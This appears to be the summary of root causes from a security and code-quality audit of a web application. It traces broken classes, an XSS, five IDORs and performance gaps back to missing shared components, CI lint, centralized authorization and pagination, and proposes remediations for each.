1. **No shared component layer.** A broken class string or a stale helper gets copy-pasted 40 times and nothing catches it. This directly produced the 128 broken classes, the 11 duplicate modals, the 7 duplicate toasts — and, through the diverged `renderEmailContent`, the P0-1 XSS.
2. **No lint or tests in CI.** A hard `ReferenceError` on the application's primary screen was committed and survived. ESLint reports it as `no-undef` in under a second.
3. **Authorization is reimplemented per controller.** Five IDORs, all the same shape: fetch by ID, check a role, forget to check ownership. A single `authorizeResource(model, ownerField)` middleware plus a test matrix eliminates the class.
4. **No performance budget.** Nothing in the codebase considers the second thousand rows — no pagination, no indexes, no `.lean()`, no queue. Every list endpoint was written as if the dataset were permanently small.

---

*Generated 2 August 2026. Every finding in this document was read from source; claims that could not be verified are marked as such in the detail files.*
